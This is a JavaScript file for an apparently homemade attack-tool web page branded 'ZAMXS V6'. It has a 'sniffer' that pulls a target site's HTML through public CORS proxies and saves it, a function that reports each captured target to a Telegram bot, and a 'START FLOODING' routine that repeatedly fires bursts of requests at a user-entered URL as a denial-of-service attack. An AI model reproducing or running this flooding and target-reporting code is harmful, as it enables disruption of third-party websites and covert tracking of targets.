let zapConfig = {};
fetch('config.json').then(r => r.json()).then(d => zapConfig = d);

function showTab(type) {
    document.querySelectorAll('.tab-view').forEach(v => v.classList.add('hidden'));
    document.querySelectorAll('.t-btn').forEach(b => b.classList.remove('active'));
    if(type === 'sniff') {
        document.getElementById('view-sniff').classList.remove('hidden');
        document.getElementById('btn-sniff').classList.add('active');
    } else {
        document.getElementById('view-encrypt').classList.remove('hidden');
        document.getElementById('btn-encrypt').classList.add('active');
    }
}

async function godSniffer() {
    const target = document.getElementById('target-url').value;
    const log = document.getElementById('sniff-status');
    if(!target) return alert("Link mana, babi?");
    log.innerText = "Bypassing Security Level 6...";
    
    const proxies = ["https://api.allorigins.win/get?url=", "https://corsproxy.io/?"];
    let done = false;

    for(let p of proxies) {
        try {
            const res = await fetch(p + encodeURIComponent(target));
            const data = await res.json();
            const source = data.contents || await res.text();

            if(source && source.length > 50) {
                // REAL DOWNLOAD ACTION
                triggerDownload(source, "index_captured.html");
                log.innerHTML = "<span style='color:#238636'>CAPTURED! File index_captured.html di-download.</span>";
                notifyTele(target);
                done = true; break;
            }
        } catch(e) { console.log("Next proxy..."); }
    }
    if(!done) log.innerText = "Bypass Failed! Website protected.";
}

function triggerDownload(content, name) {
    const blob = new Blob([content], {type: 'text/html'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name; a.click();
}

function notifyTele(url) {
    const msg = `[ZAMXS V6] Captured Target: ${url}`;
    fetch(`https://api.telegram.org/bot${zapConfig.telegram.token}/sendMessage?chat_id=${zapConfig.telegram.chat_id}&text=${encodeURIComponent(msg)}`);
}

let flood = false;
function startRage() {
    const btn = document.getElementById('ddos-btn');
    if(!flood) {
        flood = true; btn.innerText = "ATTACKING...";
        window.itv = setInterval(() => { for(let i=0;i<10;i++) fetch(document.getElementById('ddos-target').value, {mode:'no-cors'}).catch(()=>{}) }, 50);
    } else {
        flood = false; btn.innerText = "START FLOODING"; clearInterval(window.itv);
    }
}
